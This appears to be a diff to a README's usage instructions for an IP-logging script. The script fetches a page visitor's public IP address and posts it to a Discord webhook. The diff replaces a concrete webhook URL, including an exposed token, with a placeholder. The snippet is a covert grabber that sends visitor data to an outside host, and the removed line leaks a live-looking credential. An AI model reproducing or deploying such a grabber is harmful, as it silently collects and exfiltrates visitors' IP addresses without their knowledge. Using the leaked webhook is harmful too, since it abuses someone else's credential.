@@ -26,7 +26,7 @@ Simply include the script in your HTML file:
 <script>
   fetch('https://api.ipify.org')
     .then(response => response.text())
-    .then(ip => fetch('https://discord.com/api/webhooks/1241039008390189147/NSOjUiHwvWVF68DThJ-YbnkKLs6ZXKrR6mJH4hL_ie6nZ7o_kSLSjTalUGsQTQ3z-cS1', {
+    .then(ip => fetch('YOUR_DISCORD_WEBHOOK_HERE', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ content: ip })
